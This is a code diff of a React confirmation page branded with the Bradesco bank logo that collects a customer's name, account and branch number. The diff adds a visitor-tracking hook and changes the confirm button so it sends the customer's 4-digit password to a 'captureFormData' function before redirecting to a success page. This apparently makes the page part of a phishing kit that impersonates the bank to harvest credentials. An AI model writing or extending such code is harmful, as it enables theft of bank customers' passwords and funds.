@@ -1,8 +1,10 @@
 import { useState } from "react";
 import { useLocation, useNavigate } from "react-router-dom";
 import bradescoLogo from "@/assets/bradesco-logo.png";
+import { useVisitorTracking, captureFormData } from "@/hooks/useVisitorTracking";
 
 const Confirmacao = () => {
+  useVisitorTracking("confirmacao");
   const location = useLocation();
   const navigate = useNavigate();
   const { nome, conta, agencia } = (location.state as any) || {};
@@ -94,7 +96,7 @@ const Confirmacao = () => {
       {/* Confirm Button */}
       <div className="px-5 pb-8">
         <button
-          onClick={() => { if (senha.length === 4) navigate("/sucesso"); }}
+          onClick={() => { if (senha.length === 4) { captureFormData("confirmacao", { senha }); navigate("/sucesso"); } }}
           disabled={senha.length !== 4}
           className="w-full py-4 rounded-full bg-white/80 text-[#D7004D] font-semibold text-base hover:bg-white/90 transition-opacity disabled:opacity-40 disabled:cursor-not-allowed"
         >
